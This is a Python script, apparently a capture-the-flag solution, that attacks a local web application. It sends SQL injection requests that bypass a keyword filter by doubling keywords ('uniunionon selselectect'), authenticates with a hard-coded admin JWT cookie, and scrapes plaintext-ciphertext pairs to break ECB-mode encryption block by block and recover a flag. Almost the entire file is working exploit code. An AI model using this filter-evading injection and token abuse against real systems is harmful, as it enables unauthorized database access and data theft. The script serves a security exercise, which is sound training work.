import requests
from bs4 import BeautifulSoup
chiper_to_unlock = "8acc636db062f79f78c2dfa24674bcbc0a7a36b281669ce54bf07418c387337096758c49706cd4bde980a247f4c9335bfd1a60679edf40b326ca1a990a96aebed03c358690357d82f1708c399dff8b27d6aa4acad5acf0d68381c98cccd5ae92"
pair_list = []
chiper_dictionary = []
for i in range(54):
    response = requests.get('http://127.0.0.1:8008/post?id=5 uniunionon selselectect * frfromom enc whwhereere id=' + str(i+1), headers={'Cookie': 'token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6dHJ1ZSwidXNlciI6ImFkbWluIiwiaGludCI6Im5vdGhpbmcgaGVyZSJ9.0PfeyUVvAFvevm4GDMMLidco89OHmwGIwkDl8vmM01M'})
    soup = BeautifulSoup(response.content, 'html.parser')
    for script in soup(["script", "style"]):
        script.extract()    # rip it out
    text = soup.get_text()
    # break into lines and remove leading and trailing space on each
    lines = (line.strip() for line in text.splitlines())
    # break multi-headlines into a line each
    chunks = (phrase.strip() for line in lines for phrase in line.split("  "))
    # drop blank lines
    text = '\n'.join(chunk for chunk in chunks if chunk)
    #print(text)
    length = len(text)
    index = length-1
    temp_chiper = ""
    temp_text = ""
    flag = True
    while True :
        if(flag):
            temp_chiper = text[index] + temp_chiper
            if (text[index-1] == "}"):
                flag = False
        else:
            temp_text =  text[index] + temp_text
            if (text[index-11:index-1] == "Blog Posts"):
                break
        index = index - 1
    temp_pair = [temp_text,temp_chiper]
    pair_list.append(temp_pair)
    steps = int(len(temp_text) / 16)
    #generate code dictionary
    for j in range(steps):
        text_element = temp_text[j*16:16 * (j + 1)]
        chiper_element = temp_chiper[j*32:32 * (j + 1)]
        chiper_dictionary.append([text_element,chiper_element])

chiper_block_number = int(len(chiper_to_unlock)/32)
flag = ""
for i in range(chiper_block_number):
    chiper = chiper_to_unlock[32*i:32*(i+1)]
    for j in range(len(chiper_dictionary)):
        if(chiper_dictionary[j][1] == chiper):
            flag = flag + chiper_dictionary[j][0]
print(flag)
